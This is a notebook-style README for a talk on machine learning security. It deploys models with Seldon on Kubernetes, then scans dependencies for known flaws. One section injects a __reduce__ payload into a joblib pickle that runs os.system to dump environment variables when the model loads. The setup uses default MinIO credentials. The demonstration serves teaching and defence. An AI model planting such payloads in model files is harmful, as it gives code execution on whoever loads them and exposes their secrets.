[![Maintenance](https://img.shields.io/badge/Maintained%3F-YES-green.svg)](https://github.com/EthicalML/awesome-production-machine-learning/graphs/commit-activity)
![GitHub](https://img.shields.io/badge/Release-PROD-yellow.svg)
![GitHub](https://img.shields.io/badge/Languages-MULTI-blue.svg)
![GitHub](https://img.shields.io/badge/License-MIT-lightgrey.svg)
[![GitHub](https://img.shields.io/twitter/follow/axsaucedo.svg?label=Follow)](https://twitter.com/AxSaucedo/)


<table>
<tr>
<td width="70%">
<h1>Flawed Machine Learning Security</h1>
</td>
<td>
<a href="https://youtu.be/dKjCWfuvYxQ?t=147"><img src="images/bosstown.gif"></a> <br> (AKA Exploring Secure ML)
</td>
</td>
</table>


## About this repo

This Repo contains a set of resources relevant to the talk "Secure Machine Learning at Scale with MLSecOps", and provides a set of examples to showcase practical common security flaws throughout the multiple phases of the machine learning lifecycle.


## Quick links

[TODO] Below are links to resources related to the talk, as well as references and relevant areas in machine learning security.

| | | |
|-|-|-|
|[🔍 High Level Frameworks & Principles](#high-level-frameworks-and-principles) |[🔏 Processes & Checklists](#processes-and-checklists) | [🔨 Interactive & Practical Tools](#interactive-and-practical-tools)|
|[📜 Industry standards initiatives](#industry-standards-initiatives)|[📚 Online Courses](#online-courses-and-learning-resources)|[🤖 Research and Industry Newsletters](#research-and-industry-newsletters)|
|[⚔ Regulation and Policy](#regulation-and-policy)|||

## Other relevant resources

<table>
  <tr>
    <td width="30%">
         You can join the <a href="https://ethical.institute/mle.html">Machine Learning Engineer</a> newsletter. You will receive updates on open source frameworks, tutorials and articles curated by machine learning professionals.
    </td>
    <td width="70%">
        <a href="https://ethical.institute/mle.html"><img src="images/mleng.png"></a>
    </td>
  </tr>
</table>

## Requirements

Requirements on CLIs
* kubectl
* istioctl
* mc (minio client)
* Kubernetes > 1.18
* Python 3.7

### Setup Kubernetes Cluster

#### Install and setup Istio


```python
!istioctl install -y
```


```bash
%%bash
kubectl apply -n istio-system -f - << END
apiVersion: networking.istio.io/v1alpha3
kind: Gateway
metadata:
  name: seldon-gateway
spec:
  selector:
    istio: ingressgateway # use istio default controller
  servers:
  - port:
      number: 80
      name: http
      protocol: HTTP
    hosts:
    - "*"
END
```

#### Setup Seldon Core


```bash
%%bash
kubectl create ns seldon-system
helm upgrade --install \
    seldon-core seldon-core-operator \
    --repo https://storage.googleapis.com/seldon-charts  \
    --set usageMetrics.enabled=true --namespace seldon-system \
    --set istio.enabled="true" --set istio.gateway="seldon-gateway.istio-system.svc.cluster.local" \
    --version 1.13.1
```

#### Setup & configure MinIO


```bash
%%bash
kubectl create ns minio-system
helm repo add minio https://helm.min.io/
helm install minio minio/minio \
    --set accessKey=minioadmin \
    --set secretKey=minioadmin \
    --namespace minio-system
```

    "minio" already exists with the same configuration, skipping
    NAME: minio
    LAST DEPLOYED: Sun Apr 10 13:24:52 2022
    NAMESPACE: minio-system
    STATUS: deployed
    REVISION: 1
    TEST SUITE: None
    NOTES:
    Minio can be accessed via port 9000 on the following DNS name from within your cluster:
    minio.minio-system.svc.cluster.local
    
    To access Minio from localhost, run the below commands:
    
      1. export POD_NAME=$(kubectl get pods --namespace minio-system -l "release=minio" -o jsonpath="{.items[0].metadata.name}")
    
      2. kubectl port-forward $POD_NAME 9000 --namespace minio-system
    
    Read more about port forwarding here: http://kubernetes.io/docs/user-guide/kubectl/kubectl_port-forward/
    
    You can now access Minio server on http://localhost:9000. Follow the below steps to connect to Minio server with mc client:
    
      1. Download the Minio mc client - https://docs.minio.io/docs/minio-client-quickstart-guide
    
      2. Get the ACCESS_KEY=$(kubectl get secret minio -o jsonpath="{.data.accesskey}" | base64 --decode) and the SECRET_KEY=$(kubectl get secret minio -o jsonpath="{.data.secretkey}" | base64 --decode)
    
      3. mc alias set minio-local http://localhost:9000 "$ACCESS_KEY" "$SECRET_KEY" --api s3v4
    
      4. mc ls minio-local
    
    Alternately, you can use your browser or the Minio SDK to access the server - https://docs.minio.io/categories/17


    Error from server (AlreadyExists): namespaces "minio-system" already exists


Once minio is runnning you need to open another terminal and run:
```
kubectl port-forward -n minio-system svc/minio 9000:9000
```


```python
!mc config host add minio-seldon http://localhost:9000 minioadmin minioadmin
```

    [m[32mAdded `minio-seldon` successfully.[0m
    [0m


```python
!mc mb minio-seldon/fml-artifacts/ -p
```

    [m[32;1mBucket created successfully `minio-seldon/fml-artifacts/`.[0m
    [0m


```bash
%%bash
kubectl apply -f - << END
apiVersion: v1
kind: Secret
metadata:
  name: seldon-init-container-secret
type: Opaque
stringData:
  RCLONE_CONFIG_S3_TYPE: s3
  RCLONE_CONFIG_S3_PROVIDER: minio
  RCLONE_CONFIG_S3_ACCESS_KEY_ID: minioadmin
  RCLONE_CONFIG_S3_SECRET_ACCESS_KEY: minioadmin
  RCLONE_CONFIG_S3_ENDPOINT: http://minio.minio-system.svc.cluster.local:9000
  RCLONE_CONFIG_S3_ENV_AUTH: "false"
END
```

    secret/seldon-init-container-secret created


## Model Training Artifacts

#### Install requirements for model


```python
%%writefile requirements.txt
seldon_core
scikit-learn == 0.24.2
numpy >= 1.8.2
joblib == 0.16.0
```

    Writing requirements.txt



```python
!pip install -r requirements.txt
```

#### Import datasets to train Iris model


```python
from sklearn import datasets

iris = datasets.load_iris()
X, y = iris.data, iris.target
```

#### Import simple LogsticRegression model


```python
from sklearn.linear_model import LogisticRegression

model = LogisticRegression(solver="liblinear", multi_class='ovr')
```

#### Train model with dataset


```python
model.fit(X, y)
```




    LogisticRegression(multi_class='ovr', solver='liblinear')



#### Run prediction to test model


```python
model.predict(X[:1])
```




    array([0])



#### Dump model binary with pickle


```python
!mkdir -p fml-artifacts/safe/
```


```python
import joblib

joblib.dump(model, "fml-artifacts/safe/model.joblib")
```




    ['fml-artifacts/safe/model.joblib']




```python
!bat fml-artifacts/safe/model.joblib
```

#### Deploy the model


```python
!mc cp -r fml-artifacts/ minio-seldon/fml-artifacts/
```

    ...el.joblib:  1.08 KiB / 1.08 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 127.81 KiB/s 0s[0m[0m[m[32;1m


```bash
%%bash
kubectl apply -f - << END
apiVersion: machinelearning.seldon.io/v1
kind: SeldonDeployment
metadata:
  name: model-safe
spec:
  predictors:
  - graph:
      implementation: SKLEARN_SERVER
      modelUri: s3://fml-artifacts/safe
      envSecretRefName: seldon-init-container-secret
      name: classifier
    name: default
END
```

    seldondeployment.machinelearning.seldon.io/model-safe unchanged



```python
!kubectl get pods
```

    NAME                                              READY   STATUS    RESTARTS   AGE
    model-safe-default-0-classifier-774975578-kt7bg   2/2     Running   0          33s



```python
import requests

url = "http://localhost:80/seldon/default/model-safe/api/v1.0/predictions"
requests.post(url, json={"data": {"ndarray": [[1,2,3,4]]}}).json()
```




    {'data': {'names': ['t:0', 't:1', 't:2'],
      'ndarray': [[0.0006985194531162835,
        0.00366803903943666,
        0.995633441507447]]},
     'meta': {'requestPath': {'classifier': 'seldonio/sklearnserver:1.14.0-dev'}}}



## Load Pickle and Inject Malicious Code


```python
import joblib

model_safe = joblib.load("fml-artifacts/safe/model.joblib")
```


```python
model_safe.predict(X[:1])
```




    array([0])




```python
import types, os

def __reduce__(self):
    cmd = "env > pwnd.txt" # E.g. base64.b64decode("ZW52ID4gcHduZC50eHQ=")
    return os.system, (cmd,)
```


```python
model_safe.__class__.__reduce__ = types.MethodType(__reduce__, model_safe.__class__)
```


```python
!mkdir -p fml-artifacts/unsafe/
```


```python
joblib.dump(model_safe, "fml-artifacts/unsafe/model.joblib")
```




    ['fml-artifacts/unsafe/model.joblib']




```python
!bat fml-artifacts/unsafe/model.joblib
```

#### Deploy the model


```python
!mc cp -r fml-artifacts/ minio-seldon/fml-artifacts/
```

    ...el.joblib:  1.05 KiB / 1.05 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 115.81 KiB/s 0s[0m[0m


```bash
%%bash
kubectl apply -f - << END
apiVersion: machinelearning.seldon.io/v1
kind: SeldonDeployment
metadata:
  name: model-unsafe
spec:
  predictors:
  - graph:
      implementation: SKLEARN_SERVER
      modelUri: s3://fml-artifacts/unsafe
      envSecretRefName: seldon-init-container-secret
      name: classifier
    name: default
END
```

    seldondeployment.machinelearning.seldon.io/model-unsafe created



```python
!kubectl get pods
```

    NAME                                                 READY   STATUS    RESTARTS   AGE
    model-safe-default-0-classifier-774975578-kt7bg      2/2     Running   0          5m35s
    model-unsafe-default-0-classifier-6c9699c8c9-rg24t   2/2     Running   0          2m27s



```bash
%%bash
UNSAFE_POD=$(kubectl get pod -l app=model-unsafe-default-0-classifier -o jsonpath="{.items[0].metadata.name}")
kubectl exec $UNSAFE_POD -c classifier -- head -5 pwnd.txt
```

    SERVICE_TYPE=MODEL
    LC_ALL=C.UTF-8
    MODEL_UNSAFE_DEFAULT_SERVICE_PORT_GRPC=5001
    MODEL_UNSAFE_DEFAULT_SERVICE_PORT_HTTP=8000
    MODEL_SAFE_DEFAULT_PORT_5001_TCP_PROTO=tcp


#### Now reload the insecure pickle


```python
!ls pwnd.txt
```

    ls: cannot access 'pwnd.txt': No such file or directory



```python
import joblib

model_unsafe = joblib.load("fml-artifacts/unsafe/model.joblib")
```


```python
!head -4 pwnd.txt
```

    CONDA_PROMPT_MODIFIER=(base) 
    TMUX=/tmp/tmux-1000/default,97,0
    PYSPARK_DRIVER_PYTHON=jupyter
    USER=alejandro


#### Cleaning Deployed Services


```python
!kubectl delete sdep model-safe model-unsafe 
```

    seldondeployment.machinelearning.seldon.io "model-safe" deleted
    seldondeployment.machinelearning.seldon.io "model-unsafe" deleted


## Model Server

#### Revisiting our requirements


```python
!cat requirements.txt
```

    seldon_core
    scikit-learn == 0.24.2
    numpy >= 1.8.2
    joblib == 0.16.0



```python
!pip install pipdeptree
```

    Collecting pipdeptree
      Using cached pipdeptree-2.2.1-py3-none-any.whl (21 kB)
    Requirement already satisfied: pip>=6.0.0 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from pipdeptree) (22.0.4)
    Installing collected packages: pipdeptree
    Successfully installed pipdeptree-2.2.1



```python
!pipdeptree
```

#### Identifying shortcomings of pip

If we visualise the output of sklearn itself, we can see that for the dependencies we have a set of ranges as follows:

```
scikit-learn==0.24.2
  - joblib [required: >=0.11, installed: 0.16.0]
  - numpy [required: >=1.13.3, installed: 1.21.5]
  - scipy [required: >=0.19.1, installed: 1.7.3]
    - numpy [required: >=1.16.5,<1.23.0, installed: 1.21.5]
  - threadpoolctl [required: >=2.0.0, installed: 3.1.0]
```

This means that if we run an install, we may have 2nd+ level dependencies that may change causing undesired effects.

#### Workaround with PIP

We can actually create our makeshift environment freeze by using PIP directly.


```python
!pip freeze > requirements-freeze.txt
```


```python
!head -10 requirements-freeze.txt
```

    attrs==21.4.0
    bcrypt==3.1.7
    certifi==2021.10.8
    cffi==1.15.0
    charset-normalizer==2.0.12
    click==8.0.4
    cryptography==3.4.8
    docker-compose==1.25.0
    dockerpty==0.4.1
    docopt==0.6.2


#### Solving with Poetry

A better solution is to use poetry to lock the dependencies required into a .lock file that saves a fully reproducible environment.


```python
%%writefile pyproject.toml
[tool.poetry]
name = "fml-security"
version = "0.1.0"
description = ""
authors = ["Alejandro Saucedo <axsauze@gmail.com>"]

[tool.poetry.dependencies]
python = ">=3.7,<3.11"

seldon-core = "1.13.1"
scikit-learn = "0.24.2"
numpy = "1.21.5"
joblib = "0.16.0"

[tool.poetry.dev-dependencies]
pytest = "^5.2"

[build-system]
requires = ["poetry-core>=1.0.0"]
build-backend = "poetry.core.masonry.api"
```

    Overwriting pyproject.toml



```python
!poetry install
```


```python
!head -20 poetry.lock
```

    [[package]]
    name = "atomicwrites"
    version = "1.4.0"
    description = "Atomic file writes."
    category = "dev"
    optional = false
    python-versions = ">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*"
    
    [[package]]
    name = "attrs"
    version = "21.4.0"
    description = "Classes Without Boilerplate"
    category = "main"
    optional = false
    python-versions = ">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*"
    
    [package.extras]
    dev = ["coverage[toml] (>=5.0.2)", "hypothesis", "pympler", "pytest (>=4.3.0)", "six", "mypy", "pytest-mypy-plugins", "zope.interface", "furo", "sphinx", "sphinx-notfound-page", "pre-commit", "cloudpickle"]
    docs = ["furo", "sphinx", "zope.interface", "sphinx-notfound-page"]
    tests = ["coverage[toml] (>=5.0.2)", "hypothesis", "pympler", "pytest (>=4.3.0)", "six", "mypy", "pytest-mypy-plugins", "zope.interface", "cloudpickle"]


### Dependency Vulnerability Scans

#### Scanning Python Versions against CVE Database


```python
!pip install safety
```

    Requirement already satisfied: safety in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (1.10.3)
    Requirement already satisfied: requests in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (2.27.1)
    Requirement already satisfied: Click>=6.0 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (8.0.4)
    Requirement already satisfied: packaging in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (21.3)
    Requirement already satisfied: setuptools in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (62.0.0)
    Requirement already satisfied: dparse>=0.5.1 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (0.5.1)
    Requirement already satisfied: importlib-metadata in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from Click>=6.0->safety) (4.11.3)
    Requirement already satisfied: toml in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from dparse>=0.5.1->safety) (0.10.2)
    Requirement already satisfied: pyyaml in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from dparse>=0.5.1->safety) (5.4.1)
    Requirement already satisfied: pyparsing!=3.0.5,>=2.0.2 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from packaging->safety) (3.0.8)
    Requirement already satisfied: idna<4,>=2.5 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->safety) (3.3)
    Requirement already satisfied: certifi>=2017.4.17 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->safety) (2021.10.8)
    Requirement already satisfied: charset-normalizer~=2.0.0 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->safety) (2.0.12)
    Requirement already satisfied: urllib3<1.27,>=1.21.1 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->safety) (1.26.5)
    Requirement already satisfied: zipp>=0.5 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from importlib-metadata->Click>=6.0->safety) (3.8.0)
    Requirement already satisfied: typing-extensions>=3.6.4 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from importlib-metadata->Click>=6.0->safety) (4.1.1)



```python
!safety check -r requirements-freeze.txt
```

    +==============================================================================+
    |                                                                              |
    |                               /$$$$$$            /$$                         |
    |                              /$$__  $$          | $$                         |
    |           /$$$$$$$  /$$$$$$ | $$  \__//$$$$$$  /$$$$$$   /$$   /$$           |
    |          /$$_____/ |____  $$| $$$$   /$$__  $$|_  $$_/  | $$  | $$           |
    |         |  $$$$$$   /$$$$$$$| $$_/  | $$$$$$$$  | $$    | $$  | $$           |
    |          \____  $$ /$$__  $$| $$    | $$_____/  | $$ /$$| $$  | $$           |
    |          /$$$$$$$/|  $$$$$$$| $$    |  $$$$$$$  |  $$$$/|  $$$$$$$           |
    |         |_______/  \_______/|__/     \_______/   \___/   \____  $$           |
    |                                                          /$$  | $$           |
    |                                                         |  $$$$$$/           |
    |  by pyup.io                                              \______/            |
    |                                                                              |
    +==============================================================================+
    | REPORT                                                                       |
    | checked 50 packages, using free DB (updated once a month)                    |
    +============================+===========+==========================+==========+
    | package                    | installed | affected                 | ID       |
    +============================+===========+==========================+==========+
    | numpy                      | 1.21.5    | <1.22.0                  | 44717    |
    | numpy                      | 1.21.5    | <1.22.0                  | 44716    |
    | numpy                      | 1.21.5    | <1.22.2                  | 44715    |
    +==============================================================================+[0m


#### Code Scans for Security

We use `bandit` for python AST code scans, which we can make sure to extend as well to some of the code that is being used in Jupyter notebooks where relevant.


```python
!pip install bandit
```


```python
!bandit .
```

    [main]	INFO	profile include tests: None
    [main]	INFO	profile exclude tests: None
    [main]	INFO	cli include tests: None
    [main]	INFO	cli exclude tests: None
    [main]	INFO	running on Python 3.7.12
    [manager]	WARNING	Skipping directory (.), use -r flag to scan contents
    [95mRun started:2022-04-10 17:04:48.838869[0m
    [95m
    Test results:[0m
    	No issues identified.
    [95m
    Code scanned:[0m
    	Total lines of code: 0
    	Total lines skipped (#nosec): 0
    [95m
    Run metrics:[0m
    	Total issues (by severity):
    		Undefined: 0
    		Low: 0
    		Medium: 0
    		High: 0
    	Total issues (by confidence):
    		Undefined: 0
    		Low: 0
    		Medium: 0
    		High: 0
    [95mFiles skipped (0):[0m


#### Dependency Updating

Ensuring dependencies are up to date continuously is important. There are older dependencies like `piprot` but also good tools like `dependeabot`.


```python
!pip install piprot
```

    Collecting piprot
      Downloading piprot-0.9.11.tar.gz (8.5 kB)
      Preparing metadata (setup.py) ... [?25ldone
    [?25hRequirement already satisfied: requests in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from piprot) (2.27.1)
    Collecting requests-futures
      Downloading requests_futures-1.0.0-py2.py3-none-any.whl (7.4 kB)
    Requirement already satisfied: six in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from piprot) (1.16.0)
    Requirement already satisfied: certifi>=2017.4.17 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->piprot) (2021.10.8)
    Requirement already satisfied: idna<4,>=2.5 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->piprot) (3.3)
    Requirement already satisfied: charset-normalizer~=2.0.0 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->piprot) (2.0.12)
    Requirement already satisfied: urllib3<1.27,>=1.21.1 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->piprot) (1.26.5)
    Building wheels for collected packages: piprot
      Building wheel for piprot (setup.py) ... [?25ldone
    [?25h  Created wheel for piprot: filename=piprot-0.9.11-py2.py3-none-any.whl size=7939 sha256=91e4561d9861e29b801b7a3bf433a281180b5d438f0507726b529f2ce9007643
      Stored in directory: /home/alejandro/.cache/pip/wheels/4f/9c/3e/63acac74a6d463ff5f08b0d51c0891b7a33e591c0a1dc3bb59
    Successfully built piprot
    Installing collected packages: requests-futures, piprot
    Successfully installed piprot-0.9.11 requests-futures-1.0.0



```python
!piprot requirements-freeze.txt
```


```bash
%%bash
mkdir -p owasp/deps owasp/data/cache owasp/report
docker run --rm \
    -e user=$USER \
    -u $(id -u ${USER}):$(id -g ${USER}) \
    --volume $(pwd):/src:z \
    --volume $(pwd)/owasp/data:/usr/share/dependency-check/data:z \
    --volume $(pwd)/owasp/report:/report:z \
    owasp/dependency-check:latest \
    --scan /src \
    --format "ALL" \
    --project "dependency-check scan: $(pwd)" \
    --out /report
```

    [INFO] Checking for updates
    [INFO] Skipping NVD check since last check was within 4 hours.
    [INFO] Skipping RetireJS update since last update was within 24 hours.
    [INFO] Check for updates complete (29 ms)
    [INFO] 
    
    Dependency-Check is an open source tool performing a best effort analysis of 3rd party dependencies; false positives and false negatives may exist in the analysis performed by the tool. Use of the tool and the reporting provided constitutes acceptance for use in an AS IS condition, and there are NO warranties, implied or otherwise, with regard to the analysis or its use. Any use of the tool and the reporting provided is at the user’s risk. In no event shall the copyright holder or OWASP be held liable for any damages whatsoever arising out of or in connection with the use of this tool, the analysis performed, or the resulting report.
    
    
       About ODC: https://jeremylong.github.io/DependencyCheck/general/internals.html
       False Positives: https://jeremylong.github.io/DependencyCheck/general/suppression.html
    
    💖 Sponsor: https://github.com/sponsors/jeremylong
    
    
    [INFO] Analysis Started
    [INFO] Finished File Name Analyzer (0 seconds)
    [INFO] Finished Dependency Merging Analyzer (0 seconds)
    [INFO] Finished Version Filter Analyzer (0 seconds)
    [INFO] Finished Hint Analyzer (0 seconds)
    [INFO] Created CPE Index (3 seconds)
    [INFO] Finished CPE Analyzer (3 seconds)
    [INFO] Finished False Positive Analyzer (0 seconds)
    [INFO] Finished NVD CVE Analyzer (0 seconds)
    [INFO] Finished Sonatype OSS Index Analyzer (0 seconds)
    [INFO] Finished Vulnerability Suppression Analyzer (0 seconds)
    [INFO] Finished Dependency Bundling Analyzer (0 seconds)
    [INFO] Analysis Complete (3 seconds)
    [INFO] Writing report to: /report/dependency-check-report.xml
    [INFO] Writing report to: /report/dependency-check-report.html
    [INFO] Writing report to: /report/dependency-check-report.json
    [INFO] Writing report to: /report/dependency-check-report.csv
    [INFO] Writing report to: /report/dependency-check-report.sarif
    [INFO] Writing report to: /report/dependency-check-junit.xml



```python
!ls owasp/report
```

    dependency-check-junit.xml    dependency-check-report.json
    dependency-check-report.csv   dependency-check-report.sarif
    dependency-check-report.html  dependency-check-report.xml



```python
!cat owasp/report/dependency-check-report.csv
```

    "Project","ScanDate","DependencyName","DependencyPath","Description","License","Md5","Sha1","Identifiers","CPE","CVE","CWE","Vulnerability","Source","CVSSv2_Severity","CVSSv2_Score","CVSSv2","CVSSv3_BaseSeverity","CVSSv3_BaseScore","CVSSv3","CPE Confidence","Evidence Count"



```python

```
